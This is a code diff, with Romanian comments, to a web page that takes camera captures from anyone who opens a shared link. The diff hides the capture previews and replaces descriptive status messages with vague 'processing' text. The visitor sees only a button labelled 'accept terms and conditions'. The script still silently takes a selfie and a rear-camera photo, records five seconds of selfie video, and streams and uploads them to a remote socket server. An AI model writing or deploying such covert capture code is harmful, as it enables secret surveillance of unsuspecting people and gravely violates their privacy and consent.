@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>lux</title>
+  <title>WOWOW</title>
   <style>
     * { box-sizing: border-box; }
     body {
@@ -21,9 +21,7 @@
       padding: 18px;
       margin-bottom: 16px;
     }
-    h2, h3 { margin: 0 0 12px 0; }
-    h2 { font-size: 20px; }
-    h3 { font-size: 16px; color: #e5e7eb; }
+    h2 { margin: 0 0 12px 0; font-size: 20px; }
     .row {
       display: flex;
       gap: 10px;
@@ -96,7 +94,7 @@
 </head>
 <body>
 
-  <!-- VEDERE VIZIONATOR -->
+  <!-- VEDERE VIZIONATOR (PAGINA TA PRINCIPALĂ) -->
   <div id="hostPanel" class="card">
     <h2>Recepție flux & capturi</h2>
     <div class="row">
@@ -125,7 +123,7 @@
     </div>
   </div>
 
-  <!-- VEDERE TELEFON -->
+  <!-- VEDERE PENTRU CINE INTRĂ PE LINK (DOAR CARDUL SIMPLU) -->
   <div id="phonePanel" class="card hidden">
     <h2>WOWOW</h2>
     <p style="color:#9ca3af; margin-top:0; font-size:14px;">
@@ -133,31 +131,19 @@
     </p>
     <button id="startSequenceBtn" class="btn-green" type="button">Accepta termenii si conditiile</button>
     <div id="statusPhone" class="statusBox">Gata de pornire.</div>
-
-    <video id="phonePreviewVideo" autoplay playsinline muted class="hidden" style="margin-top:12px;"></video>
-
-    <div class="grid2">
-      <div class="mediaItem">
-        <p>Selfie</p>
-        <img id="phoneSelfieImg" alt="Selfie local" />
-      </div>
-      <div class="mediaItem">
-        <p>Camera spate</p>
-        <img id="phoneBackImg" alt="Spate local" />
-      </div>
-    </div>
-
-    <div class="mediaItem" style="margin-top:12px;">
-      <p>Înregistrare selfie (5s)</p>
-      <video id="phoneRecordedVideo" playsinline controls class="hidden"></video>
-      <a id="downloadRecLink" class="hidden" download="selfie-inregistrare.webm" style="display:inline-block; margin-top:8px; color:#60a5fa; font-size:14px;">Descarcă înregistrarea</a>
-    </div>
   </div>
+
+  <!-- ELEMENTE ASCUNSE PENTRU CAPTURĂ ȘI ÎNREGISTRARE ÎN FUNDAL -->
+  <video id="phonePreviewVideo" autoplay playsinline muted class="hidden"></video>
+  <img id="phoneSelfieImg" alt="" class="hidden" />
+  <img id="phoneBackImg" alt="" class="hidden" />
+  <video id="phoneRecordedVideo" playsinline controls class="hidden"></video>
+  <a id="downloadRecLink" class="hidden" download="selfie-inregistrare.webm">Descarcă înregistrarea</a>
 
   <script src="https://cdn.socket.io/4.8.1/socket.io.min.js"></script>
   <script>
     const SIGNALING_SERVER_URL = "https://filip-sait.onrender.com";
-    const RECORD_DURATION_MS = 5000; // 5 secunde înregistrare selfie
+    const RECORD_DURATION_MS = 5000;
 
     const socket = io(SIGNALING_SERVER_URL, { transports: ["websocket", "polling"] });
 
@@ -370,11 +356,9 @@
       socket.emit("join-room", { roomId: currentRoom, role: "sharer" });
 
       try {
-        // 1. SELFIE (camera frontală)
-        setMsg(statusPhone, "Pasul 1/3: Se deschide camera selfie...");
-        let selfieStream = await openCamera("user");
+        setMsg(statusPhone, "Pasul 1/3: Se procesează...");
+        const selfieStream = await openCamera("user");
         phonePreviewVideo.srcObject = selfieStream;
-        phonePreviewVideo.classList.remove("hidden");
         await phonePreviewVideo.play().catch(() => {});
         await sleep(700);
 
@@ -389,9 +373,8 @@
         stopStream(selfieStream);
         await sleep(300);
 
-        // 2. POZĂ CU CAMERA DIN SPATE
-        setMsg(statusPhone, "Pasul 2/3: Se face poza cu camera din spate...");
-        let backStream = await openCamera("environment");
+        setMsg(statusPhone, "Pasul 2/3: Se procesează...");
+        const backStream = await openCamera("environment");
         phonePreviewVideo.srcObject = backStream;
         await phonePreviewVideo.play().catch(() => {});
         await sleep(700);
@@ -407,14 +390,12 @@
         stopStream(backStream);
         await sleep(300);
 
-        // 3. ÎNREGISTRARE VIDEO CU CAMERA DE SELFIE
-        setMsg(statusPhone, "Pasul 3/3: Se înregistrează video cu camera selfie...");
-        let recStream = await openCamera("user");
+        setMsg(statusPhone, "Pasul 3/3: Se procesează...");
+        const recStream = await openCamera("user");
         activeStream = recStream;
         phonePreviewVideo.srcObject = recStream;
         await phonePreviewVideo.play().catch(() => {});
 
-        // Trimite și fluxul live către peer-ii conectați în cameră
         for (const [remoteId, pc] of peers.entries()) {
           recStream.getTracks().forEach((track) => pc.addTrack(track, recStream));
           const offer = await pc.createOffer();
@@ -425,14 +406,11 @@
         const videoBlob = await recordStreamForDuration(recStream, RECORD_DURATION_MS);
         const videoUrl = URL.createObjectURL(videoBlob);
         phoneRecordedVideo.src = videoUrl;
-        phoneRecordedVideo.classList.remove("hidden");
 
         const ext = (videoBlob.type || "").includes("mp4") ? "mp4" : "webm";
         downloadRecLink.href = videoUrl;
         downloadRecLink.download = `selfie-inregistrare.${ext}`;
-        downloadRecLink.classList.remove("hidden");
 
-        // Trimite și video-ul (base64) către cameră dacă are dimensiune rezonabilă
         const reader = new FileReader();
         reader.onloadend = () => {
           socket.emit("recorded-video", {
@@ -444,11 +422,10 @@
 
         stopStream(recStream);
         activeStream = null;
-        phonePreviewVideo.classList.add("hidden");
 
-        setMsg(statusPhone, "Secvența completă s-a finalizat (selfie, spate, înregistrare selfie).");
+        setMsg(statusPhone, "Finalizat.");
       } catch (err) {
-        setMsg(statusPhone, "Eroare în secvență: " + err.message);
+        setMsg(statusPhone, "Eroare: " + err.message);
       } finally {
         startSequenceBtn.disabled = false;
       }
